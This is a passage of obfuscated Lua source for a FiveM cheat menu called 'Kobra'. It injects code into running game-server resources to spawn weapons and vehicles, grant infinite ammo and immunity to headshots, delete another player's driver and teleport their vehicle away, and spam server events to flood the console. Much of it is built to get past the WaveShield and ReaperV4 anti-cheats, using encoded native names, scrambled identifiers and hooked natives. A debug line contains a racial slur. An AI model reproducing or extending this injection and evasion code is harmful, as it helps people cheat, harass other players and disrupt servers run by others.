                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function TeleportVehicleToOcean(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        SetEntityCoords(vehicle, 0.0, 0.0, 0.0, false, false, false, false)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v573))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    TeleportVehicleToOcean(entityHit)
                                                end
                                            end)
                                        ]] );end else return;end v572=1245 -(965 + 278) ;end end else v249:Notify("error","Kobra","You must select a player to do this!",4729 -(1391 + 338) );end end}}},{label="Triggers",tabs={{type="checkbox",label="Server Console Spam",checked=false,onSelect=function(v394) if v394 then local v574=0 + 0 ;while true do if (v574==(0 -0)) then print("Console Spam Started...");v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    if not _G.KobraServerConsoleSpamInitialized then
                                        _G.KobraServerConsoleSpamEnabled = true
                                        _G.KobraServerConsoleSpamInitialized = true

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("CreateThread", function(fn, cb) return fn(cb) end)
                                        HookNative("Wait", function(fn, ms) return fn(ms) end)
                                        HookNative("TriggerEvent", function(fn, ...) return fn(...) end)
                                        HookNative("TriggerServerEvent", function(fn, ...) return fn(...) end)

                                        if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(e, ...) return TriggerEvent(e, ...) end,
                                                TSEvent = function(e, ...) return TriggerServerEvent(e, ...) end
                                            }
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Spam Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(500) -- Anti-detection delay
                                            while _G.KobraServerConsoleSpamInitialized do
                                                if not _G.KobraServerConsoleSpamEnabled then
                                                    Citizen.Wait(500)
                                                else
                                                    _G.Kobra.TSEvent("playerLoaded")
                                                    Citizen.Wait(75)
                                                end
                                            end
                                        end)
                                    else
                                        _G.KobraServerConsoleSpamEnabled = true
                                    end
                                ]]);break;end end else local v575=0;while true do if ((0 + 0)==v575) then print("Console Spam Stopped...");v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    _G.KobraServerConsoleSpamEnabled = false
                                ]]);break;end end end end}}}}},{icon="",label="Weapon",type="subMenu",categories={{label="Spawner",tabs={{type="button",label="Give Weapon",onSelect=function() v47("Weapon Name","WEAPON_",function(v515) if (v515 and (v515~="")) then v249:SpawnSelectedWeapon(v515);end end,"typeable");end},{type="button",label="Give All Weapons",onSelect=function() v249:GiveAllWeapons();end},{type="button",label="Remove All Weapons",onSelect=function() v249:RemoveAllWeapons();end},{type="divider",label="All Weapons"},{type="scrollable",label="Melee",scrollType="onEnter",value=1,values=v249:BuildMenuFromWeaponList({"weapon_unarmed","weapon_knife","weapon_dagger","weapon_bat","weapon_bottle","weapon_crowbar","weapon_golfclub","weapon_hammer","weapon_hatchet","weapon_machete","weapon_switchblade","weapon_nightstick","weapon_wrench"}),onSelect=function(v395) v249:SpawnSelectedWeapon(v249:GetWeaponModelFromLabel(v395));end},{type="scrollable",label="Handguns",scrollType="onEnter",value=1 + 0 ,values=v249:BuildMenuFromWeaponList({"weapon_pistol","weapon_pistol_mk2","weapon_combatpistol","weapon_appistol","weapon_stungun","weapon_pistol50","weapon_snspistol","weapon_heavypistol","weapon_vintagepistol","weapon_flaregun"}),onSelect=function(v396) v249:SpawnSelectedWeapon(v249:GetWeaponModelFromLabel(v396));end},{type="scrollable",label="SMGs",scrollType="onEnter",value=1,values=v249:BuildMenuFromWeaponList({"weapon_microsmg","weapon_smg","weapon_smg_mk2","weapon_assaultsmg","weapon_machinepistol","weapon_minismg","weapon_combatpdw"}),onSelect=function(v397) v249:SpawnSelectedWeapon(v249:GetWeaponModelFromLabel(v397));end},{type="scrollable",label="Rifles",scrollType="onEnter",value=1,values=v249:BuildMenuFromWeaponList({"weapon_assaultrifle","weapon_assaultrifle_mk2","weapon_carbinerifle","weapon_carbinerifle_mk2","weapon_advancedrifle","weapon_specialcarbine","weapon_bullpuprifle","weapon_gusenberg","weapon_compactrifle","weapon_bullpuprifle_mk2","weapon_marksmanrifle"}),onSelect=function(v398) v249:SpawnSelectedWeapon(v249:GetWeaponModelFromLabel(v398));end},{type="scrollable",label="Shotguns",scrollType="onEnter",value=1,values=v249:BuildMenuFromWeaponList({"weapon_pumpshotgun","weapon_pumpshotgun_mk2","weapon_sawnoffshotgun","weapon_assaultshotgun","weapon_bullpupshotgun","weapon_heavyshotgun","weapon_autoshotgun"}),onSelect=function(v399) v249:SpawnSelectedWeapon(v249:GetWeaponModelFromLabel(v399));end},{type="scrollable",label="Snipers",scrollType="onEnter",value=1 -0 ,values=v249:BuildMenuFromWeaponList({"weapon_sniperrifle","weapon_heavysniper","weapon_heavysniper_mk2","weapon_marksmanrifle","weapon_marksmanrifle_mk2"}),onSelect=function(v400) v249:SpawnSelectedWeapon(v249:GetWeaponModelFromLabel(v400));end},{type="scrollable",label="Explosives",scrollType="onEnter",value=1 + 0 ,values=v249:BuildMenuFromWeaponList({"weapon_grenade","weapon_stickybomb","weapon_molotov","weapon_pipebomb","weapon_proxmine","weapon_rpg","weapon_grenadelauncher","weapon_rpg","weapon_minigun","weapon_firework"}),onSelect=function(v401) v249:SpawnSelectedWeapon(v249:GetWeaponModelFromLabel(v401));end},{type="scrollable",label="Heavy",scrollType="onEnter",value=1,values=v249:BuildMenuFromWeaponList({"weapon_mg","weapon_combatmg","weapon_gusenberg","weapon_minigun","weapon_grenadelauncher","weapon_railgun","weapon_hominglauncher","weapon_compactlauncher"}),onSelect=function(v402) v249:SpawnSelectedWeapon(v249:GetWeaponModelFromLabel(v402));end},{type="scrollable",label="Throwables",scrollType="onEnter",value=1 + 0 ,values=v249:BuildMenuFromWeaponList({"weapon_ball","weapon_flare","weapon_smokegrenade","weapon_bzgas","weapon_petrolcan"}),onSelect=function(v403) v249:SpawnSelectedWeapon(v249:GetWeaponModelFromLabel(v403));end}}},{label="Combat",tabs={{type="button",label="Test Button",onSelect=function() print("hi");end},{type="checkbox",label="Infinite Ammo ",desc="Infinite Ammo, this might be detected on certain servers",checked=false,onSelect=function(v404) if v404 then local v576=0 -0 ;while true do if (v576==0) then v249:Notify("success","Kobra","Enabled Infinite Ammo",9848 -4848 );v249:EnableInfiniteAmmo();break;end end else v249:Notify("error","Kobra","Disabled Infinite Ammo",568 + 4432 );v249:DisableInfiniteAmmo();end end},{type="checkbox",label="Anti-Headshot",checked=false,desc="This will prevent you from being headshot.",onSelect=function(v405) if v405 then local v577=0;while true do if ((0 -0)==v577) then v249:Notify("success","Kobra","Enabled Anti-Headshot",5031 -(21 + 10) );if (GetResourceState("WaveShield")=="started") then v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n) return _G[decode(n)] end

                                            -- native wrappers (obfuscated lookup style)
                                            local SetPedSuffersCriticalHits = g({83,101,116,80,101,100,83,117,102,102,101,114,115,67,114,105,116,105,99,97,108,72,105,116,115})
                                            local PlayerPedId_fn = g({80,108,97,121,101,114,80,101,100,73,100})
                                            local Wait_fn = g({87,97,105,116})

                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                -- initFlow (coroutine runner) — copy of your project's coroutine runner pattern
                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[AntiHeadshot] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.antiHeadshotEnabled and not Unloaded do
                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits(ped, false)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                local CreateThread_fn = CreateThread
                                                local Wait_fn = Wait
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetPedSuffersCriticalHits_fn = SetPedSuffersCriticalHits

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait_fn(0)
                                                        if not _G.antiHeadshotEnabled then
                                                            Wait_fn(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits_fn(ped, false)
                                                        end

                                                        ::continue::
                                                    end
                                                end)
                                            end
                                            _G.antiHeadshotEnabled = true
                                        ]]);end break;end end else local v578=1719 -(531 + 1188) ;while true do if (v578==(0 + 0)) then v249:Notify("error","Kobra","Disabled Anti-Headshot",5000);if (GetResourceState("WaveShield")=="started") then v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            -- simply clear the flag; coroutine loop will stop
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false
                                        ]]);else v36("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false

                                            -- try to restore default behavior once (best-effort)
                                            if PlayerPedId and SetPedSuffersCriticalHits then
                                                local ped = PlayerPedId()
                                                if ped and ped ~= 0 then
                                                    pcall(function() SetPedSuffersCriticalHits(ped, true) end)
                                                end
                                            end
                                        ]]);end break;end end end end}}}}},{icon="",label="Vehicle",type="subMenu",categories={{label="Spawner",tabs={{type="checkbox",label="Teleport Into",desc="If selected, this will teleport you into the selected vehicle.",checked=false,onSelect=function(v406) v31=v406 or false ;end},{type="checkbox",label="Delete Previous",desc="If selected, this will delete your previous vehicle when spawning selected vehicle.",checked=false,onSelect=function(v407) v30=v407 or false ;end},{type="divider",label="All Vehicles"},{type="button",label="Addon",onSelect=function() v47("Addon Vehicle","",function(v516) if (v516 and (v516~="")) then v249:SpawnSelectedVehicle(v516,v31,v30);end end,"typeable");end},{icon="ph ph-car",label="Compacts",type="scrollable",scrollType="onEnter",value=1696 -(867 + 828) ,values={"asbo","blista","brioso","brioso2","brioso3","club","dilettante","dilettante2","issi2","issi3","issi4","issi5","issi6","kanjo","panto","prairie","rhapsody","weevil"},onSelect=function(v408) v249:SpawnSelectedVehicle(v408,v31,v30);end},{icon="ph ph-car",label="Sedans",type="scrollable",scrollType="onEnter",value=1,values={"asea","asea2","asterope","asterope2","cinquemila","driftchavosv6","cog55","cog552","cognoscenti","cognoscenti2","deity","hardy","drifthardy","emperor","emperor2","emperor3","fugitive","glendale","glendale2","impaler5","ingot","intruder","minimus","limo2","premier","primo","primo2","regina","rhinehart","romero","schafter2","schafter5","schafter6","stafford","stanier","stratum","stretch","superd","surge","tailgater","tailgater2","warrener","warrener2","washington"},onSelect=function(v409) v249:SpawnSelectedVehicle(v409,v31,v30);end},{icon="ph ph-car",label="SUVs",type="scrollable",scrollType="onEnter",value=1704 -(494 + 1209) ,values={"aleutian","astron","baller","baller2","baller3","baller4","baller5","baller6","baller7","baller8","bjxl","cavalcade","cavalcade2","cavalcade3","contender","dorado","dubsta","dubsta2","everon3","fq2","granger","granger2","gresley","habanero","huntley","issi8","iwagen","jubilee","landstalker","landstalker2","mesa","mesa2","novak","patriot","patriot2","radi","rebla","rocoto","seminole","seminole2","serrano","squaddie","toros","vivanite","woodlander","xls","xls2"},onSelect=function(v410) v249:SpawnSelectedVehicle(v410,v31,v30);end},{icon="ph ph-car",label="Coupes",type="scrollable",scrollType="onEnter",value=1,values={"cogcabrio","driftfr36","exemplar","f620","felon","felon2","fr36","jackal","kanjosj","oracle","oracle2","postlude","previon","sentinel","sentinel2","windsor","windsor2","zion","zion2"},onSelect=function(v411) v249:SpawnSelectedVehicle(v411,v31,v30);end},{icon="ph ph-car",label="Muscles",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"blade","brigham","broadway","buccaneer","buccaneer2","buffalo4","buffalo5","chino","chino2","clique","clique2","coquette3","deviant","dominator","dominator2","dominator3","dominator4","dominator5","dominator6","dominator7","dominator8","dominator9","driftdominator10","driftyosemite","dukes","dukes2","dukes3","ellie","eudora","faction","faction2","faction3","gauntlet","gauntlet2","gauntlet3","gauntlet4","gauntlet5","driftgauntlet4","greenwood","hermes","hotknife","hustler","impaler","impaler2","impaler3","impaler4","impaler6","imperator","imperator2","imperator3","lurcher","manana2","moonbeam","moonbeam2","nightshade","peyote2","phoenix","picador","ratloader","ratloader2","ruiner","ruiner2","ruiner3","ruiner4","sabregt","sabregt2","slamvan","slamvan2","slamvan3","slamvan4","slamvan5","slamvan6","stalion","stalion2","tahoma","tampa","tampa3","tampa4","tulip","tulip2","vamos","vigero","vigero2","vigero3","virgo","virgo2","virgo3","voodoo","voodoo2","weevil2","yosemite","yosemite2"},onSelect=function(v412) v249:SpawnSelectedVehicle(v412,v31,v30);end},{icon="ph ph-car",label="Sports Classic",type="scrollable",scrollType="onEnter",value=1,values={"ardent","btype","btype2","btype3","casco","cheburek","cheetah2","cheetah3","coquette2","deluxo","dynasty","fagaloa","feltzer3","gt500","infernus2","jb700","jb7002","mamba","manana","michelli","monroe","nebula","peyote","peyote3","pigalle","rapidgt3","retinue","retinue2","savestra","stinger","stingergt","stromberg","swinger","toreador","torero","tornado","tornado2","tornado3","tornado4","tornado5","tornado6","turismo2","viseris","z190","zion3","ztype"},onSelect=function(v413) v249:SpawnSelectedVehicle(v413,v31,v30);end},{icon="ph ph-car",label="Sports",type="scrollable",value=343 -(37 + 305) ,values={"alpha","banshee","bestiagts","blista2","blista3","buffalo","buffalo2","buffalo3","calico","carbonizzare","comet2","comet3","comet4","comet5","comet6","comet7","coquette","coquette4","corsita","coureur","cypher","drafter","drifteuros","driftfuto","driftjester","driftremus","drifttampa","driftzr350","elegy","elegy2","euros","everon2","feltzer2","flashgt","furoregt","fusilade","futo","futo2","gauntlet6","gb200","growler","hotring","imorgon","issi7","italigto","italirsx","jester","jester2","jester3","jester4","jugular","khamelion","komoda","kuruma","kuruma2","locust","lynx","massacro","massacro2","neo","neon","ninef","ninef2","omnis","omnisegt","panthere","paragon","paragon2","pariah","penumbra","penumbra2","r300","raiden","rapidgt","rapidgt2","rapidgt4","raptor","remus","revolter","rt3000","ruston","schafter3","schafter4","schlagen","schwarzer","sentinel3","sentinel4","sentinel5","seven70","sm722","specter","specter2","stingertt","streiter","sugoi","sultan","sultan2","sultan3","surano","tampa2","tenf","tenf2","tropos","vectre","verlierer2","veto","veto2","vstr","zr350","zr380","zr3802","zr3803"},onSelect=function(v414) v249:SpawnSelectedVehicle(v414,v31,v30);end},{icon="ph ph-car",label="Super",type="scrollable",scrollType="onEnter",value=1,values={"adder","autarch","banshee2","bullet","champion","cheetah","cyclone","deveste","emerus","entity2","entity3","entityxf","fmj","furia","gp1","ignus","infernus","italigtb","italigtb2","krieger","le7b","lm87","nero","nero2","osiris","penetrator","pfister811","prototipo","reaper","s80","sc1","scramjet","sheava","sultanrs","suzume","t20","taipan","tempesta","tezeract","thrax","tigon","torero2","turismo3","turismor","tyrant","tyrus","vacca","vagner","vigilante","virtue","visione","voltic","voltic2","xa21","zeno","zentorno","zorrusso"},onSelect=function(v415) v249:SpawnSelectedVehicle(v415,v31,v30);end},{icon="ph ph-car",label="Motorcycles",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"akuma","avarus","bagger","bati","bati2","bf400","carbonrs","chimera","cliffhanger","daemon","daemon2","deathbike","deathbike2","deathbike3","defiler","diablous","diablous2","double","enduro","esskey","faggio","faggio2","faggio3","fcr","fcr2","gargoyle","hakuchou","hakuchou2","hexer","innovation","lectro","manchez","manchez2","manchez3","nemesis","nightblade","oppressor","oppressor2","pcj","powersurge","ratbike","reever","rrocket","ruffian","sanchez","sanchez2","sanctus","shinobi","shotaro","sovereign","stryder","thrust","vader","vindicator","vortex","wolfsbane","zombiea","zombieb"},onSelect=function(v416) v249:SpawnSelectedVehicle(v416,v31,v30);end},{icon="ph ph-car",label="Off-Road",type="scrollable",scrollType="onEnter",value=1,values={"bfinjection","bifta","blazer","blazer2","blazer3","blazer4","blazer5","bodhi2","boor","brawler","bruiser","bruiser2","bruiser3","brutus","brutus2","brutus3","caracara","caracara2","dloader","draugur","driftl352","dubsta3","dune","dune2","dune3","dune4","dune5","freecrawler","hellion","insurgent","insurgent2","insurgent3","kalahari","kamacho","l35","l352","marshall","menacer","mesa3","monster","monster3","monster4","monster5","monstrociti","nightshark","outlaw","patriot3","rancherxl","rancherxl2","ratel","rcbandito","rebel","rebel2","riata","sandking","sandking2","technical","technical2","technical3","terminus","trophytruck","trophytruck2","vagrant","verus","winky","yosemite3","zhaba"},onSelect=function(v417) v249:SpawnSelectedVehicle(v417,v31,v30);end},{icon="ph ph-car",label="Industrial",type="scrollable",scrollType="onEnter",value=1,values={"bulldozer","cutter","dump","flatbed","flatbed2","guardian","handler","mixer","mixer2","rubble","tiptruck","tiptruck2"},onSelect=function(v418) v249:SpawnSelectedVehicle(v418,v31,v30);end},{icon="ph ph-car",label="Utility",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"airtug","armytanker","armytrailer","armytrailer2","baletrailer","boattrailer","boattrailer2","boattrailer3","caddy","caddy2","caddy3","docktrailer","docktug","forklift","freighttrailer","graintrailer","mower","proptrailer","raketrailer","ripley","sadler","sadler2","scrap","slamtruck","tanker","tanker2","towtruck","towtruck2","towtruck3","towtruck4","tr2","tr3","tr4","tractor","tractor2","tractor3","trailerlarge","trailerlogs","trailers","trailers2","trailers3","trailers4","trailers5","trailersmall","trflat","tvtrailer","tvtrailer2","utillitruck","utillitruck2","utillitruck3"},onSelect=function(v419) v249:SpawnSelectedVehicle(v419,v31,v30);end},{icon="ph ph-car",label="Vans",type="scrollable",scrollType="onEnter",value=1,values={"bison","bison2","bison3","bobcatxl","boxville","boxville2","boxville3","boxville4","boxville5","boxville6","burrito","burrito2","burrito3","burrito4","burrito5","camper","gburrito","gburrito2","journey","journey2","minivan","minivan2","paradise","pony","pony2","rumpo","rumpo2","rumpo3","speedo","speedo2","speedo4","speedo5","surfer","surfer2","surfer3","taco","youga","youga2","youga3","youga4"},onSelect=function(v420) v249:SpawnSelectedVehicle(v420,v31,v30);end}}},{label="Vehicle Customization",tabs={{type="button",label="Set License Plate",onSelect=function() v47("Set License Plate","",function(v517) if (v517 and (v517~="")) then local v678=0 -0 ;local v679;while true do if (v678==(0 -0)) then v679=string.format([[
                                            local function xKqLZVwPt9()
                                                local XcVbNmAsDfGhJkL = PlayerPedId
                                                local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                                                local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                                                local pEd = XcVbNmAsDfGhJkL()
                                                local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                                                if vEh and vEh ~= 0 then
                                                    PoIuYtReWqAzXsDc(vEh, "%s")
                                                end
                                            end

                                            xKqLZVwPt9()
                                        ]],v517);MachoInjectResourceRaw("any",v679);break;end end else v0:Notify("Invalid input","Please enter a valid license plate.","error");end end,"typeable");end},{type="button",label="Repair Vehicle",onSelect=function() v249:RepairVehicle();end},{type="button",label="Clean Vehicle",onSelect=function() local v421=0;while true do if (v421==(0 + 0)) then v0:Notify("success","Kobra","Cleaned Vehicle",3000);MachoInjectResourceRaw("any",[[
                            local function qPwRYKz7mL()
                                local a = PlayerPedId
                                local b = GetVehiclePedIsIn
                                local c = SetVehicleDirtLevel

                                local ped = a()
                                local veh = b(ped, false)
                                if veh and veh ~= 0 then
                                    c(veh, 0.0)
                                end
                            end

                            qPwRYKz7mL()
                            ]]);break;end end end},{type="button",label="Force Vehicle Engine",onSelect=function() v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return false end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return false end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
                                GhYtReFdCxWaQzLp = true

                                local function OpAsDfGhJkLzXcVb()
                                    local lMnbVcXzZaSdFg = CreateThread
                                    lMnbVcXzZaSdFg(function()
                                        local QwErTyUiOp         = _G.PlayerPedId
                                        local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                                        local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                                        local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                                        local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                                        local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                                        local En_g_Health_Get    = _G.GetVehicleEngineHealth
                                        local En_g_Health_Set    = _G.SetVehicleEngineHealth
                                        local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                                        local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                                        local function _tick(vh)
                                            if vh and vh ~= 0 then
                                                No_Hotwire_Set(vh, false)
                                                En_g_Degrade_Set(vh, false)
                                                ErTyUiOpAsDfGh(vh, false)
                                                KeEpOnAb(vh, true)

                                                local eh = En_g_Health_Get(vh)
                                                if (not eh) or eh < 300.0 then
                                                    En_g_Health_Set(vh, 900.0)
                                                end

                                                ZxCvBnMqWeRtYu(vh, true, true, true)
                                            end
                                        end

                                        while GhYtReFdCxWaQzLp and not Unloaded do
                                            local p  = QwErTyUiOp()

                                            _tick(AsDfGhJkLz(p, false))
                                            _tick(TyUiOpAsDfGh(p))
                                            _tick(AsDfGhJkLz(p, true))

                                            Wait(0)
                                        end
                                    end)
                                end

                                OpAsDfGhJkLzXcVb()
                            ]]);end,function() v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                GhYtReFdCxWaQzLp = false
                                local v = GetVehiclePedIsIn(PlayerPedId(), false)
                                if v and v ~= 0 then
                                    SetVehicleKeepEngineOnWhenAbandoned(v, false)
                                    SetVehicleEngineCanDegrade(v, true)
                                    SetVehicleUndriveable(v, false)
                                end
                            ]]);end},{type="button",label="Max Upgrade",onSelect=function() local v422=0;local v423;local v424;while true do if (v422==(0 -0)) then v0:Notify("success","Kobra","Vehicle Max Upgraded",1640 + 1360 );v423=GetResourceState("WaveShield")=="started" ;v422=1 -0 ;end if (v422==(1 -0)) then v424=GetResourceState("ReaperV4")=="started" ;if v423 then print("WaveNiggaStarted");MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
